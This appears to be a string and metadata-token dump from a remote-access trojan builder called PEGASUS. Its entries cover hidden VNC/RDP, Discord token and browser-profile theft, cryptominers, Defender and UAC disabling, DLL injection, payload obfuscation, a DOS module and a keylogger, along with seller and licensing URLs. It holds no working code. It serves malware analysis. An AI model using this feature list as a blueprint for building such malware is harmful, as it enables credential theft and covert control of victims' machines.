+button1|06000143,06000721,06000756,0600076D,060007CA,0600080A,0600083B|
+button2|06000143,060005BA,060005DE|
+button3|06000143,060005BA,060005DE|
+bv.png|060009AC|
+bw.png|060009AC|
+by.png|060009AC|
+Bytes|060005AC|
+bz.png|060009AC|
+C:/Users/AppData/Local|06000596,0600059F,06000618,06000619,0600061E|
+C:/Users/AppData/Local/Temp|06000596,0600059F,06000618,06000619,0600061E|
+C:/Users/AppData/Roaming|06000596,0600059F,06000618,06000619,0600061E|
+C:\Program Files\Windows Defender\MpCmdRun.exe|06000680|
+C:\temp|0600067D|
+C:\Temp|0600067C,0600067D|
+C:\Temp\testfile.exe|0600067C,0600067E|
+C++  HVNC|06000123|
+ca.png|060009AC|
+Camera|0600093C,06000B77|
+Cancel|06000087,060000A1,060000A2,060000A4,060000A5,06000143,0600059F,060005BA,060005DE,0600061E,060006DF,06000707,06000710,06000718,06000A1B,06000A1C,06000A1E,06000A1F|
+Caption|0600007B|
+capture|060007F7,06000831,06000BB7|
+Capture On/Off|0600080A,0600083B|
+catalonia.png|060009AC|
+cc.png|060009AC|
+CD Drive|060006D5|
+cd.png|060009AC|
+CeMXFJGYO.exe|0600098A|
+Century Gothic|060006A1,060006A5,060009AC,06000A39,06000B36|
+Cert Installer|06000683|
+Certificate|0600074F,06000756,06000758|
+Certificate backup|0600074F|
+cf.png|060009AC|
+cg.png|060009AC|
+ch.png|060009AC|
+Change|060006D5|
+Change Icon|06000683|
+Change Wallpaper|060009AC|
+ChangeRegistryValue|0600087B|
+ChangeValue|06000B85|
+channel|0600036A,0600036B|
+Chat|0600076D|
+Chat Connected
+|0600076D|
+Chat Room|0600076D,060009AC|
+Chat Spammer|060009AC|
+CHAT SPAMMER|060005D2|
+Chat Status:|0600076D|
+chat:|06000942,06000B90,06000B91|
+chatExit|06000765,06000B90|
+chatget|0600036A|
+chatsend|0600036B|
+chatSpammerToolStripMenuItem|060009AC|
+chatWriteInput|0600076B|
+check|06000365|
+checkblacklist|0600036C|
+checkBox1|06000683,06000721|
+China Standard Time|06000239|
+chkAnti|06000683|
+chkAntiK|06000683|
+chkAntiProcess|06000683|
+chkBsod|06000683|
+chkCert|06000683|
+chkClone|06000B36|
+chkClone1|06000B36|
+chkDisc|060005DE|
+chkExclude|06000683|
+chkIcon|06000683|
+chkKillWD|06000683|
+chkNotification|060007CA|
+chkObfu|06000683|
+chkPaste_bin|06000683|
+chkPowershell|06000683|
+chkRename|06000683|
+chkSave|06000631,060008BF|
+chkSounds|060009AC|
+chkStartStop|06000B36|
+chkTel|060005DE|
+chkUac|06000683|
+chkUSB|06000683|
+chkVBS|06000683|
+Choose Icon|06000666,06000683|
+Chrome|06000123|
+Chrome Extension Injector|060009AC|
+Chrome successfully started !|0600092E|
+Chrome successfully started with clone profile !|0600092E|
+chromeExtentionStealerToolStripMenuItem|060009AC|
+Chromodo Browser started successfully !|0600092E|
+Chromodo Browser successfully started with clone profile !|0600092E|
+Chromodo!|06000B36|
+chVRunPe|06000683|
+ci.png|060009AC|
+ck.png|060009AC|
+cl.png|060009AC|
+Clear|060009AC|
+cLEARToolStripMenuItem|060009AC|
+Client|06000639|
+Client |06000239,06000B67,06000B7E,06000B84,06000BB3,06000BB5|
+Client Control|060009AC|
+Client Country|06000608|
+Client Folder|060009AC|
+Client IP|06000608|
+ClientH.exe|060009AD|
+ClientRecoveryLabel|06000B36|
+Clients Under Control|060009AC|
+ClientsFolder|0600093B,0600093C,0600093D,06000945,06000B67,06000B84,06000BB5|
+ClientsFolder\|06000783,0600094C,06000B64,06000B7E,06000B80|
+Clinet |06000238|
+Clock|060006D5|
+Clock-|060006C0|
+Clock+|060006BF|
+Clone|06000683|
+Clone assembly info from other exe!|06000683|
+Clone Profile|06000B36|
+Clone successfully !|0600092E|
+close|06000948|
+Close|060006D5|
+Close Connexion ?|06000928,06000AF9|
+Close PEGASUS because another instance is already running.|0600012F|
+Close_50px|0600016C|
+CloseBtn|06000B36|
+CloseBtn.Image|06000B36|
+cls|060005C7,0600081D|
+cm.png|060009AC|
+Cmd|060009AC|
+CMD!|06000B36|
+cmd.exe|06000371,060006A3,06000B65|
+cmdToolStripMenuItem|060009AC|
+cn.png|060009AC|
+CN=|06000458|
+CN=PEGASUS|06000458|
+co.png|060009AC|
+CocCoc Browser started successfully !|0600092E|
+CocCoc Browser successfully started with clone profile !|0600092E|
+CocCoc!|06000B36|
+Code Obfuscation|06000683|
+comboBox1|06000143,0600083B|
+comboBox2|06000143|
+comboBoxFolder|06000683|
+comboInjection|060005BA|
+Command|06000781,06000782,06000783,06000784,06000785,06000786,06000787,06000789,0600078A,0600078B,0600078C,0600078D,0600078E,0600078F,06000790,06000793,06000794,06000795,06000796,06000831,0600085C,0600085D,06000869,0600086B,0600086C,0600086E,0600086F,06000870,06000871,06000872,06000873,06000874,0600087B,06000B85,06000BB7|
+Comodo|06000123|
+Comodo Dragon Browser started successfully!|0600092E|
+Comodo Dragon Browser successfully started with clone profile !|0600092E|
+Comodo Dragon!|06000B36|
+Company:|06000683|
+CompanyName|06000663|
+CompilerVersion|06000654|
+config|0600016D|
+configconfuser.crproj|06000651|
+Confirm Key Delete|0600086C|
+Confirm Value Delete|06000874|
+Confuser|06000651|
+confuser.zip|06000651|
+Confuser\Confuser.CLI.exe -n |06000651|
+ConfuserEx|0600016E|
+Connect|060009AC|
+CONNECT|06000423|
+Connect to this SOCKS5 Proxy: 127.0.0.1:{0} (no user/pass)|060005FF|
+Connect to this SOCKS5 Proxy: 127.0.0.1:3128 (no user/pass)|06000608|
+Connection failure. Please try again, or contact us for help.|06000372|
+Connection Sound :|060009AC|
+Connections|060009AC|
+CONNECTIONS|060006F2|
+connectToolStripMenuItem|060009AC|
+connectToolStripMenuItem1|060009AC|
+Consolas|060005C9,06000825|
+Console|06000825|
+Contact author!
+|060006A1|
+Contact us at support@auth.gg|0600030C|
+content|0600033E,0600033F,06000340,06000341,06000342,06000343,0600035B|
+contextMenuLogs|060009AC|
+contextMenuStrip|0600087D|
+contextMenuStrip1|060005B0,06000608,0600079C|
+contextMenuStrip2|060009AC|
+conttype|0600036D|
+Convert any exe to shell code!This converter is using
+Donut!
+
+|0600063F|
+Convert to shellcode|0600063F|
+Cookies|060008A1,06000B84|
+copy|0600078C|
+Copy|0600079C|
+copyFile|0600078C,06000793|
+CopyProfile|06000910|
+copyProfileToolStripMenuItem|060009AC|
+Copyright:|06000683|
+copySelectedToolStripMenuItem|060009AC|
+copySelectedToolStripMenuItem.Image|060009AC|
+copyToolStripMenuItem|0600079C|
+Cos|06000A80|
+costura|06000BC3|
+costura.antire.runtime.dll.compressed|06000BC3|
+costura.antire.runtime.pdb.compressed|06000BC3|
+costura.bouncycastle.crypto.dll.compressed|06000BC3|
+costura.costura.dll.compressed|06000BC3|
+costura.costura.pdb.compressed|06000BC3|
+costura.dnlib.dll.compressed|06000BC3|
+costura.guna.ui2.dll.compressed|06000BC3|
+costura.iconextractor.dll.compressed|06000BC3|
+costura.newtonsoft.json.dll.compressed|06000BC3|
+costura.pinvoke.kernel32.dll.compressed|06000BC3|
+costura.pinvoke.windows.core.dll.compressed|06000BC3|
+costura.protobuf-net.dll.compressed|06000BC3|
+costura.system.buffers.dll.compressed|06000BC3|
+costura.system.io.compression.dll.compressed|06000BC3|
+costura.system.memory.dll.compressed|06000BC3|
+costura.system.net.http.dll.compressed|06000BC3|
+costura.system.numerics.vectors.dll.compressed|06000BC3|
+costura.system.runtime.compilerservices.unsafe.dll.compressed|06000BC3|
+costura.system.xml.readerwriter.dll.compressed|06000BC3|
+costura.vestris.resourcelib.dll.compressed|06000BC3|
+Could not open root registry keys, you may not have the needed permission|060004BF|
+Country|060009AC|
+CPU Miner|060009AC|
+CPU Settings|0600059F|
+CPU SETTINGS|0600059F|
+CPU/GPU|06000B77|
+cpu_delay|0600020A,0600020B|
+cpu_idParameters|06000210,06000211|
+cpu_Parametrs|06000206,06000207|
+cpu_Proc|06000200,06000201|
+cpu_sysDir|06000208,06000209|
+cpu_workDir|06000204,06000205|
+cpu_zipPassword|06000202,06000203|
+CPUClientSettings|0600059F|
+cpuFile|060001FE,060001FF|
+cPUMinerToolStripMenuItem|060009AC|
+cr.png|060009AC|
+Create Folder|0600078B|
+createFolder|0600078B|
+createFolderToolStripMenuItem|0600079C|
+CreateKey|06000B85|
+CreateRegistryKey|0600086B|
+CreateRegistryValue|0600086E,0600086F,06000870,06000871,06000872,06000873|
+CreateValue|06000B85|
+cryptonight|060005BA|
+cs.png|060009AC|
+CStart|060008FC|
+cu.png|060009AC|
+Current Connection Will Be Closed!|060000E4|
+cut|06000793|
+Cut|0600079C|
+cutToolStripMenuItem1|0600079C|
+cv.png|060009AC|
+cx.png|060009AC|
+cy.png|060009AC|
+cyber_security_96px.png|06000103|
+cz.png|060009AC|
+D|06000552|
+dark|06000631,060008AD,060008BF|
+data|0600030E,06000366|
+Date|060006AC|
+DDOS|06000779|
+de.png|060009AC|
+debug|0600067C|
+Decimal|06000718|
+Decrypt_Base64|06000A3C|
+Default|06000683|
+Default Port|06000683|
+defeatFirewallToolStripMenuItem|060009AC|
+Del|0600087D|
+DELAY|060000D5,060000D8,060000D9|
+Delay for the execution of your payload!|06000683|
+DELCPUMINER|0600099B|
+Delete|0600074D,0600079C,0600087D,060009AC|
+deleteFile|06000785|
+deleteFolder|06000785|
+DeleteKey|06000B85|
+DeleteRegistryKey|0600086C|
+DeleteRegistryValue|06000874|
+deleteToolStripMenuItem|0600087D,060009AC|
+dELETEToolStripMenuItem|0600079C|
+deleteToolStripMenuItem1|0600087D,060009AC|
+deleteToolStripMenuItem2|0600087D|
+DeleteValue|06000B85|
+Deleting certain registry values could cause system instability. Are you sure you want to permanently delete |06000874|
+DELGPUMINER|0600099E|
+Deprecated and out-of-date SMTP port|060005E7|
+Description:|06000683|
+Desktop|060006D5,0600079C|
+Desktop-|060006BE|
+DESKTOP|06000789|
+Desktop+|060006BD|
+dESKTOPToolStripMenuItem|0600079C|
+Detection Rate|06000683|
+Device:|0600083B|
+DingDing|06000198,06000199|
+Disable Windows Defender:|060008E4|
+DisableAntiSpyware|0600067D|
+disableDefedner|06000911,06000957|
+disableUAC|060008E3,06000912|
+DisableUAC:|060008E3|
+disableUACToolStripMenuItem|060009AC|
+Discord|06000B67|
+Discord Options|060005DE|
+Discord Token Recovery|060009AC|
+DISCORD/TELEGRAM  RECOVERY|060005DE|
+discordStealerToolStripMenuItem|060009AC|
+disposed|0600092D|
+dj.png|060009AC|
+dk.png|060009AC|
+dll|06000796,06000AD2|
+Dll|06000238,06000740,06000764,060008D5,060008DB,060008DC,060008DD,060008E0,060008E1,060008E2,060008E3,060008E4,060008E5,060008E6,060008EA,060008EB,060008EC,060008ED,060008EE,060008EF,060008F2,060008F3,060008F4,060008F6,060008F7,060008FA,060008FB,060008FC,060008FD,06000901,06000902,06000903,06000904,0600090B,0600090C,0600090D,0600090E,06000910,06000911,06000912,06000913,06000914,06000936,0600093B,0600093C,0600093D,0600093E,06000940,06000941,06000943,06000944,06000945,06000946,06000948,06000949,0600094A,0600094B,0600094D,0600094E,0600094F,06000952,06000953,06000954,06000957,06000959,0600095A,0600095B,0600095C,0600095F,06000962,06000963,06000964,06000966,06000967,06000969,0600096A,0600096B,0600096F,06000970,0600098B,0600098D,0600098E,0600098F,06000990,06000991,06000992,06000993,06000996,06000997,06000998,0600099A,0600099B,0600099D,0600099E,0600099F,060009A0,060009A5,060009A8,060009A9,060009AA|
+DLL Injection|060009AC|
+DLL INJECTION|060005B0|
+DLLInjectionPanel|060005B0|
+dLLInjectionToolStripMenuItem|060009AC|
+dm.png|060009AC|
+dnlib|06000BC3|
+DNS redirecting has been detected!|06000319|
+do.png|060009AC|
+Donate|06000730|
+Done!|06000639|
+DON'T EVEN THINK THAT YOU CAN
+ BUILD WITHOUT MY PERMISSION!
+|060006A5|
+Don't run if debug tools are in the system!|06000683|
+Don't support files larger than 2GB.|06000811|
+donut.exe|06000639|
+dos|0600076F,06000770|
+DOS|06000779,06000B93|
+DOS ATTACK:{0}    Status:host {1}|06000771|
+dosAdd|06000954|
+doStop|060008F4,060009A0|
+Double Click on Client to activate HVNC|060009AC|
+DoubleBuffered|0600046A|
+Downloaad:|06000815|
+Download|0600079C,06000815|
+Downloaded|06000811|
+Downloaded successfully ! | Executed...|0600092E|
+downloadFromUrl|060008E1,06000964|
+downloadToolStripMenuItem|0600079C|
+Drag n drop your file : |06000A8C|
+Drivers|0600079C|
+driversListsToolStripMenuItem|0600079C|
+DuplicateProgesse|060000F1|
+DWID|06000783|
+DWORD (32-bit) Value|0600087D|
+dWORD32bitValueToolStripMenuItem|0600087D|
+dWORD32bitValueToolStripMenuItem1|0600087D|
+dWORD32bitValueToolStripMenuItem2|0600087D|
+dz.png|060009AC|
+EASY|060009AC|
+EB|06000470,060005AC|
+ec.png|060009AC|
+Edge|06000123|
+Edge successfully started !|0600092E|
+Edge successfully started with clone profile !|0600092E|
+Edge!|06000B36|
+Edit|0600087D|
+Edit DWORD (32-bit) Value|06000711|
+Edit QWORD (64-bit) Value|06000711|
+editToolStripMenuItem|0600087D|
+ee.png|060009AC|
+eg.png|060009AC|
+eh.png|060009AC|
+Electrolize|06000087,0600008F,06000092,0600009D,060000A6,060000E2,060000E6,060000F5,06000103,06000123,06000143,0600059F,060005B0,060005BA,060005C9,060005D2,060005DE,060005E7,060005F1,06000608,06000612,0600061E,06000631,0600063F,06000683,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,0600074D,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,0600080A,06000825,0600083B,0600087D,06000899,060008A1,060008AD,060008BF,060009AC,06000A0C,06000A17,06000A20,06000A39,06000B36|
+email|06000311,06000313|
+Email|060005E7,060008AD|
+Email has already been used!|06000313|
+EMAIL SENDER|060005E7|
+Email:|06000730,06000731|
+email_used|06000313|
+emailport|060001C0,060001C1|
+EmailSent|060008FD|
+Enable/Disable   Change icon of your exe!|06000683|
+Enable/Disable  Change assembly info or your exe!|06000683|
+Enable/Disable  Installation of your payload!|06000683|
+enabled|06000933|
+Enabled|0600030C|
+enckey|0600035E|
+Encoding ints...|06000A8C|
+Encrypt Payload|06000683|
+Encrypt Payload and run via RunPe!|06000683|
+Encrypting strings...|06000A8C|
+england.png|060009AC|
+Entrypoint|060005B0|
+en-US,en;q=0.9,fa;q=0.8|06000091|
+Epic Browser started successfully !|0600092E|
+Epic Browser successfully started with clone profile !|0600092E|
+Epic Browser!|06000B36|
+er.png|060009AC|
+error|06000311|
+Error|06000817|
+es.png|060009AC|
+et.png|060009AC|
+ETC miner successfully started !|0600092E|
+ETH Miner|060009AC|
+ETH miner successfully started !|0600092E|
+europeanunion.png|060009AC|
+Exclude From WD|06000683|
+exe|06000796|
+Exe|06000944|
+Exe to Shellcode Converter!|060009AC|
+exe_48px.png|0600079C|
+Exec To Ram|06000143|
+Executable (*.exe)|*.exe|0600066A|
+Executable (*.exe)|*.exe|All files (*.*)|*.*|06000638,0600067B|
+execute|06000787|
+Execute|06000612,0600079C|
+Execute .bat|060009AC|
+Execute File|060009AC|
+Execute VBS|060009AC|
+executebatToolStripMenuItem|060009AC|
+eXECUTEToolStripMenuItem|0600079C|
+executeVBSToolStripMenuItem|060009AC|
+Exhausted the search. The binary looks good to go!|0600067F|
+exit|060005C7,0600081D,0600081E|
+Exit|0600087D|
+exitToolStripMenuItem|0600087D|
+Expandable String Value|0600087D|
+expandableStringValueToolStripMenuItem|0600087D|
+expandableStringValueToolStripMenuItem1|0600087D|
+expandableStringValueToolStripMenuItem2|0600087D|
+Experation date:|06000730|
+expiry|06000730|
+Expiry Date:|06000731|
+Expiry: |06000728|
+explorer|060000DE,0600046E|
+exstractOpenToolStripMenuItem|060006AC|
+exstractOpenToolStripMenuItem.Image|060006AC|
+extend|06000314|
+Extension|060008E0|
+Extensions|06000952|
+exterminal.exe|060009AD|
+ExTerminate WDefender|060009AC|
+External Ip|06000683|
+Extras|06000683|
+-f |06000639|
+fakeBinder|060008E0|
+FakeBinder: |060008E0|
+false|06000795,060007B9,060008DB,06000B95|
+False|0600098A|
+fam.png|060009AC|
+fi.png|060009AC|
+file|06000341,06000342,06000343,0600036E|
+File|060000D5,060000D8,060000D9,06000783,06000785,06000787,0600078C,0600078D,0600078E,06000793,0600079C,0600087D,060008DB,060008DC,060008DD,060008E0,060008E4,060008E5,06000913,06000914,06000940,0600094A,06000B9A|
+File has been tampered with, couldn't verify integrity!|0600030C|
+File Manager|06000123,0600079C,060009AC|
+FILE MANAGER|0600079C|
+File Manager!|06000B36|
+File matched signature: "|06000680|
+File name:|06000683|
+File path:|06000683|
+File Search|060009AC|
+File Searcher|060007A7|
+File Version:|06000683|
+File:|06000143,06000815|
+FileDescription|06000663|
+fileformat|06000341,06000342,06000343|
+fileid|0600036E|
+fileManager|06000781,06000782,06000783,06000784,06000785,06000786,06000787,06000789,0600078A,0600078B,0600078C,0600078D,0600078E,0600078F,06000790,06000793,06000794,06000795,06000796|
+fileManager:|0600093D|
+filename|06000341,06000342,06000343|
+Filename|0600017A,0600017B|
+FileName|060008DB,060008DD,06000913,06000914,0600094A|
+fileSearcher|06000952|
+fileToolStripMenuItem|0600087D|
+FileTransferLabele|060000F1|
+FileVersion|06000663|
+Firefox|06000123|
+Firefox successfully started !|0600092E|
+Firefox successfully started with clone profile !|0600092E|
+Firefox!|06000B36|
+fj.png|060009AC|
+fk.png|060009AC|
+flowLayoutPanel1|06000B36|
+fm.png|060009AC|
+fo.png|060009AC|
+Folder|06000785,0600078B,0600078E,06000B99|
+Folders|0600079C|
+Form1|0600063F|
+FormAbout|06000730|
+FormAudio|06000742|
+FormBlockClients|0600074D|
+FormBuilder|06000683|
+FormCertificate|06000756|
+FormChat|0600076D|
+FormDOS|06000779|
+FormDownloadFile|06000815|
+FormFileManager|0600079C|
+FormFileSearcher|060007A7|
+FormFun|060006D5|
+FormKeylogger|060007B8|
+FormMiner|060005BA|
+FormNetstat|060006F2|
+FormPorts|060007CA|
+FormPowerShell|060005C9|
+FormProcessManager|060007DD|
+FormRegistryEditor|0600087D|
+FormRegValueEditBinary|060006DF|
+FormRegValueEditMultiString|06000707|
+FormRegValueEditString|06000710|
+FormRegValueEditWord|06000718|
+FormRemoteDesktop|0600080A|
+FormSendFileToMemory|06000143|
+FormSetting|06000721|
+FormShell|06000825|
+FormWebcam|0600083B|
+Found a zip backup, Extracting (BackupCertificate.zip)|0600074F|
+Foxmail!|06000B36|
+FPS:|0600083B|
+fr.png|060009AC|
+FrmAbout|060000E2|
+FrmAngry|060006A1|
+FrmCSPM|060005D2|
+FrmDiscordST3|060005DE|
+FrmEmailer|060005E7|
+FrmInfo|06000899|
+FrmKATANA|060006AC|
+FrmMassUpdate|060000E6|
+FrmNgrokPanel|060005F1|
+FrmNoStub|060006A5|
+FrmReco|060008A1|
+FrmReverseProxy|06000608|
+FrmSkynet|060006AC|
+FrmSplash|0600012D|
+FrmTransfer|060000F1|
+FrmURL|060000E6,060000F5|
+FrmVNC|06000921,0600092A,06000B36|
+FrmVNC:|06000924,06000925,06000926,06000927,06000929|
+FrmWebHookSPM|06000612|
+From Url|060009AC|
+FromEmail|060008FD|
+Fun|060006D5|
+FUN|060006D5|
+fun:|06000969,06000B75|
+ga.png|060009AC|
+GB|060003E4,06000470,060005AC,06000609|
+gb.png|060009AC|
+gd.png|060009AC|
+gd8JQ57nxXzLLMPrLylVhxoGnWGCFjO4knKTfRE6mVvdjug2NF/4aptAsZcdIGbAPmcx0O+ftU/KvMIjcfUnH3j+IMdhAW5OpoX3MrjQdf5AAP97tTB5g1wdDSAqKpq9gw06t3VaqMWZHKtPSuAXy0kkZRsc+DicpcY8E9+vWMHXa3jMdbPx4YES0p66GzhqLd/heA2zMvX8iWv4wK7S3QKIW/a9dD4ALZJpmcr9OOE=|06000318|
+ge.png|060009AC|
+GeneratedInternalTypeHelper|06000A46|
+GET|06000091|
+Get ip by link|06000683|
+getDrivers|06000782,06000786,06000790|
+getPath|06000781,06000782,06000786,06000789,0600078A,0600078F|
+getvar|06000367|
+getWebcams|06000BB7|
+gf.png|060009AC|
+gh.png|060009AC|
+gi.png|060009AC|
+Give your client a group name!|06000683|
+Give your payload a custom exe name!|06000683|
+gl.png|060009AC|
+gm.png|060009AC|
+gn.png|060009AC|
+Go to|0600079C|
+Google Chrome!|06000B36|
+gOTOToolStripMenuItem|0600079C|
+gp.png|060009AC|
+GPU Miner|060009AC|
+GPU Miner 4GB|0600061E|
+GPU Miner 6 GB + |0600061E|
+GPU RAM|06000B77|
+GPU Settings|0600061E|
+GPU SETTINGS|0600061E|
+gpu_idParameters|06000212,06000213|
+gpu4_delay|060001F6,060001F7|
+gpu4_file|060001F8,060001F9|
+gpu4_Parametrs|060001F0,060001F1|
+gpu4_Proc|060001EC,060001ED|
+gpu4_sysDir|060001F4,060001F5|
+gpu4_workDir|060001F2,060001F3|
+gpu4_zipPassword|060001EE,060001EF|
+gpu6_delay|060001EA,060001EB|
+gpu6_file|060001DE,060001DF|
+gpu6_Parametrs|060001E4,060001E5|
+gpu6_Proc|060001E0,060001E1|
+gpu6_sysDir|060001E8,060001E9|
+gpu6_workDir|060001E6,060001E7|
+gpu6_zipPassword|060001E2,060001E3|
+GPUClientSettings|0600061E|
+gPUMinerToolStripMenuItem|060009AC|
+GPURAM|060000D6,060000DA|
+gq.png|060009AC|
+gr.png|060009AC|
+Group|06000194,06000195,06000B77|
+Group:|06000683|
+GroupDisc|060005BA,060005DE|
+GroupTel|060005DE|
+gs.png|060009AC|
+gt.png|060009AC|
+gu.png|060009AC|
+guna.ui2|06000BC3|
+guna2Button1|06000A39|
+guna2Button1.Image|06000A39|
+guna2Button2|06000A39|
+guna2Button2.Image|06000A39|
+guna2Button3|06000A39|
+guna2Button3.Image|06000A39|
+guna2Button4|06000A39|
+guna2Button4.Image|06000A39|
+guna2CirclePictureBox2|060000E2|
+guna2CirclePictureBox2.Image|060000E2|
+guna2CirclePictureBox3|060000E2|
+guna2CirclePictureBox3.Image|060000E2|
+guna2ContextMenuStrip1|06000608,06000683,060006AC,060006F2,0600079C,060007DD,060009AC|
+guna2ControlBox1|060000E2,060000E6,060000F5,06000123,060009AC,06000B36|
+guna2ControlBox2|060000E2,060000E6,060000F5,06000123,060009AC,06000B36|
+guna2ControlBox3|06000123,060009AC,06000B36|
+guna2ControlBox4|06000B36|
+guna2CustomCheckBox1|06000B36|
+guna2GradientButton1|06000631,0600063F,06000683,060006D5,06000707,06000718,06000730,060007CA,060008BF,060009AC,06000B36|
+guna2GradientButton1.Image|060009AC,06000B36|
+guna2GradientButton10|060006D5,06000B36|
+guna2GradientButton10.Image|06000B36|
+guna2GradientButton11|060006D5,06000B36|
+guna2GradientButton11.Image|06000B36|
+guna2GradientButton12|060006D5,06000B36|
+guna2GradientButton12.Image|06000B36|
+guna2GradientButton13|060006D5,06000B36|
+guna2GradientButton13.Image|06000B36|
+guna2GradientButton14|060006D5,06000B36|
+guna2GradientButton14.Image|06000B36|
+guna2GradientButton15|060006D5,06000B36|
+guna2GradientButton15.Image|06000B36|
+guna2GradientButton16|060006D5,06000B36|
+guna2GradientButton16.Image|06000B36|
+guna2GradientButton17|060006D5|
+guna2GradientButton2|06000683,060006D5,060009AC,06000B36|
+guna2GradientButton2.Image|060009AC,06000B36|
+guna2GradientButton3|06000683,060006D5,060009AC,06000B36|
+guna2GradientButton3.Image|060009AC,06000B36|
+guna2GradientButton4|06000123,060006D5,060009AC,06000B36|
+guna2GradientButton4.Image|060009AC,06000B36|
+guna2GradientButton5|06000123,060006D5,060009AC,06000B36|
+guna2GradientButton5.Image|060009AC,06000B36|
+guna2GradientButton6|060006D5|
+guna2GradientButton7|060006D5|
+guna2GradientButton8|060006D5|
+guna2GradientButton9|060006D5,06000B36|
+guna2GradientButton9.Image|06000B36|
+guna2GroupBox1|06000683,060006D5,06000730|
+guna2GroupBox2|060000E2,06000683,060006D5|
+guna2GroupBox3|0600059F,0600061E,06000683,060006D5|
+guna2GroupBox4|06000683,060006D5|
+guna2GroupBox5|06000683,060006D5|
+guna2GroupBox6|060006D5|
+guna2GroupBox7|060006D5|
+guna2GroupBox8|060006D5|
+guna2GroupBox9|060006D5|
+guna2HtmlLabel1|0600012D|
+guna2HtmlLabel2|060008BF|
+guna2HtmlLabel9|060006A1|
+guna2Panel1|0600008F,06000143,0600059F,060005B0,060005BA,060005D2,060005DE,060005E7,060005F1,06000608,06000612,0600061E,06000631,0600063F,06000683,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,06000825,0600087D,06000899,060008A1,060008AD,060008BF,060009AC,06000A39,06000B36|
+guna2Panel2|060007CA,0600087D,060009AC,06000B36|
+guna2Panel3|060009AC,06000B36|
+guna2Panel4|060009AC,06000B36|
+guna2PictureBox1|0600008F,06000123,06000143,0600059F,060005B0,060005BA,060005D2,060005DE,060005E7,0600061E,06000631,0600063F,06000683,060006A1,060006A5,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,0600074D,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,0600080A,06000825,0600083B,0600087D,06000899,060008A1,060008AD,060008BF,060009AC|
+guna2PictureBox1.Image|06000123,060006A1,060006A5,060008BF,060009AC|
+guna2PictureBox10|06000123|
+guna2PictureBox10.Image|06000123|
+guna2PictureBox2|06000123,060005F1,06000608,06000631,06000683,06000730,060007CA|
+guna2PictureBox2.Image|06000123,06000631,06000683,06000730,060007CA|
+guna2PictureBox3|06000123,06000683|
+guna2PictureBox3.Image|06000123,06000683|
+guna2PictureBox4|06000123,06000683|
+guna2PictureBox4.Image|06000123,06000683|
+guna2PictureBox5|06000123,060009AC|
+guna2PictureBox5.Image|06000123,060009AC|
+guna2PictureBox6|06000123|
+guna2PictureBox6.Image|06000123|
+guna2PictureBox7|06000123,06000612,06000A39|
+guna2PictureBox7.Image|06000123|
+guna2PictureBox8|06000123|
+guna2PictureBox8.Image|06000123|
+guna2PictureBox9|06000123|
+guna2PictureBox9.Image|06000123|
+guna2ResizeBox1|06000B36|
+guna2Separator1|0600008F,06000103,06000143,0600059F,060005B0,060005BA,060005C9,060005D2,060005DE,060005E7,060005F1,06000608,06000612,0600061E,06000631,0600063F,06000683,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,0600074D,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,0600080A,06000825,0600083B,0600087D,06000899,060008A1,060008AD,060008BF,060009AC,06000A39,06000B36|
+guna2Separator2|06000683,060009AC,06000B36|
+guna2Separator3|06000683,060009AC,06000B36|
+guna2Separator4|06000683,060009AC,06000B36|
+guna2Separator5|06000683,060009AC,06000B36|
+guna2Separator6|06000103,06000683,060009AC|
+guna2Separator7|06000683,060009AC|
+guna2TabControl1|060005B0,06000683,060008A1,060009AC|
+guna2TextBox1|06000683|
+guna2TextBox2|060005E7|
+guna2ToggleSwitch1|060009AC|
+guna2VScrollBar1|06000707,06000899,060009AC,06000B36|
+guna2VScrollBar2|060009AC|
+guna2VScrollBar3|060009AC|
+guna2VScrollBar4|060009AC|
+guna2VSeparator1|06000103,06000683,060009AC,06000B36|
+guna2VSeparator2|06000103,060009AC,06000B36|
+guna2VSeparator3|060009AC,06000B36|
+guna2VSeparator4|060009AC,06000B36|
+guna2VSeparator5|060009AC,06000B36|
+guna2VSeparator6|06000B36|
+gw.png|060009AC|
+gy.png|060009AC|
+gzip, deflate|06000091|
+Hang system|060006D5|
+hangSystem|060006CA|
+hash|0600035E|
+Hash|06000238|
+hdd_48px.png|0600079C|
+heavy|060005BA|
+Hexadecimal|06000718|
+hexEditor|060006DF|
+hiddenRDPToolStripMenuItem|060009AC|
+hiddenRDPToolStripMenuItem.Image|060009AC|
+Hide|060006D5|
+hIDEPEGASUSPROCESSToolStripMenuItem|060009AC|
+hIP|060001AE,060001AF|
+hk.png|060009AC|
+HKEY_CLASSES_ROOT|060004BE|
+HKEY_CURRENT_CONFIG|060004BE|
+HKEY_CURRENT_USER|060004BE|
+HKEY_CURRENT_USER\Control Panel\Desktop|0600012F|
+HKEY_LOCAL_MACHINE|060004BE|
+HKEY_USERS|060004BE|
+hm.png|060009AC|
+hn.png|060009AC|
+Hold Mouse|060006D5|
+holdMouse|060006C8|
+hook|060001B0,060001B1|
+Host|060001CA,060001CB,0600076F,060008FD|
+Host/Port|06000683|
+HOST:|06000779|
+hPort|060001AC,060001AD|
+HQ: 99%|06000B36|
+hr.png|060009AC|
+HRDPcleanUnistallToolStripMenuItem|060009AC|
+HRDPconnectToolStripMenuItem|060009AC|
+hRDPCopy|06000991|
+hRDPRemove|06000990|
+hRDPStart|0600098E,06000996|
+hRDPUser|06000993,06000997|
+ht.png|060009AC|
+http://|0600076F|
+http://ipinfo.io/|06000B7A|
+https://api.auth.gg/csharp/|060002DE|
+https://discord.gg/w2hVN45E|06000A24|
+https://google.com|06000091|
+https://keyauth.win/api/1.0/|06000372|
+https://myexternalip.com/raw|06000675|
+https://skynetcorp.sellix.io/|060008D4,06000A37|
+https://skynetcorp.sellix.io/ |06000939|
+https://t.me/+Izuv0GvwIOU3ZTNk|060000E2,06000A34|
+https://t.me/joinchat/Izuv0GvwIOU3ZTNk|06000A29|
+https://www.pantheon.one/|06000A28,06000A35|
+https://www.pantheon.one/category/video-tutorials/|06000960|
+https://www.pantheon.one/shop/|0600072E,060008E8|
+https://www.pantheon.one/support/|060008F5|
